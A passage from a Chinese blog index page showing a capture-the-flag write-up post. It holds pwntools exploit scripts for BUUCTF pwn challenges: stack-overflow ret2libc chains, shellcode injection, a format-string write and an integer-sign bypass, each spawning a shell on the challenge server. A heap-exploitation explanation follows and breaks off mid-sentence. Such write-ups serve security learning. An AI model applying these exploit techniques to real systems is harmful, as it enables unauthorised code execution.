<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/15/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/15/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-2/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:05:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:05:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:57" itemprop="dateModified" datetime="2023-03-01T11:30:57+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>重点讲解第26题：babyheap的解题方法。</p>
<h1 id="buu017-not_the_same_3dsctf_2016"><a class="markdownIt-Anchor" href="#buu017-not_the_same_3dsctf_2016"></a> buu017-not_the_same_3dsctf_2016</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25850</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x2d</span>) + p32(elf.symbols[<span class="string">&#x27;get_secret&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x80ECA2D</span>) + p32(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu018-ciscn_2019_n_5"><a class="markdownIt-Anchor" href="#buu018-ciscn_2019_n_5"></a> buu018-ciscn_2019_n_5</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29724</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400713</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">bss = <span class="number">0x601080</span></span><br><span class="line">leave = <span class="number">0x4006a9</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me your name&#x27;</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>) + p64(bss) + p64(bss)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu019-others_shellcode"><a class="markdownIt-Anchor" href="#buu019-others_shellcode"></a> buu019-others_shellcode</h1>
<p>连上就行</p>
<h1 id="buu020-ciscn_2019_ne_5"><a class="markdownIt-Anchor" href="#buu020-ciscn_2019_ne_5"></a> buu020-ciscn_2019_ne_5</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25761</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">76</span>) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">76</span>) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu021-铁人三项第五赛区_2018_rop"><a class="markdownIt-Anchor" href="#buu021-铁人三项第五赛区_2018_rop"></a> buu021-铁人三项(第五赛区)_2018_rop</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26419</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc32&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8c</span>) + p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = write - libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># sys = base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8c</span>) + p32(sys) + p32(binsh) + p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu022-bjdctf_2020_babyrop"><a class="markdownIt-Anchor" href="#buu022-bjdctf_2020_babyrop"></a> buu022-bjdctf_2020_babyrop</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27132</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">8</span>) + p64(poprdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me u story!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">8</span>) + p64(poprdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me u story!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu023-bjdctf_2020_babystack2"><a class="markdownIt-Anchor" href="#buu023-bjdctf_2020_babystack2"></a> buu023-bjdctf_2020_babystack2</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">16</span>+<span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu024-jarvisoj_fm"><a class="markdownIt-Anchor" href="#buu024-jarvisoj_fm"></a> buu024-jarvisoj_fm</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29021</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(fmtstr_payload(<span class="number">11</span>, &#123;<span class="number">0x804A02C</span>: <span class="number">4</span>&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu025-pwn2_sctf_2016"><a class="markdownIt-Anchor" href="#buu025-pwn2_sctf_2016"></a> buu025-pwn2_sctf_2016</h1>
<p>这一题真是吃尽苦头，LibcSearcher不给力，找半天也没找到适合的libc（应该是libc6-i386_2.23_0ubuntu10_amd64，但是由于LibcSearcher连的是ubuntu官网，这个版本被删了，然后就找不到了。。。）。看着这道题没做出来实在是气，不过又看到了程序中有一个int 80，于是思考能不能用系统调用解决问题。发现很难，因为给的gadget都是inc，执行完vuln函数之后eax,ebx,edx都是很小的值，总不可能一个inc执行几十万次吧？<br />
查看了下gadget，ebx,edi,esi,ebp倒是能直接控制，对于eax,ecx,edx还是要费很多心思。<br />
后来给用pip装的LibcSearcher卸了换上<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">国人写的</a>就好了。果然还是国人给力o(￣▽￣)ｄ<br />
exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29855</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_anyaddr</span>(<span class="params">addr</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(addr))</span><br><span class="line">	content = io.recvuntil(<span class="string">b&#x27;How&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(4)</span></span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(sys) + p32(binsh) + p32(binsh))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu026-babyheap_0ctf_2017"><a class="markdownIt-Anchor" href="#buu026-babyheap_0ctf_2017"></a> buu026-babyheap_0ctf_2017</h1>
<p>第一道堆题。<br />
<strong>解法：unsorted bin overlapping chunks + fastbin attack</strong><br />
提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：<br />
<img src="1.png" alt="" /><br />
简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。<br />
首先，这道题中<strong>对于内存的分配使用的是calloc而非malloc函数</strong>，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，<strong>本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度</strong>。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。<br />
<img src="2.png" alt="" /></p>
<p>获取到了这里的地址，我们就可以获取到system函数和__free_hook的地址。本题环境为2.23，无tcache的影响，有通过fastbin attack修改__malloc_hook的可行性。</p>
<p>这是一开始__malloc_hook附近的情况：<br />
<img src="3.png" alt="" /><br />
要想在__malloc_hook附近分配chunk，首先需要通过检查：</p>
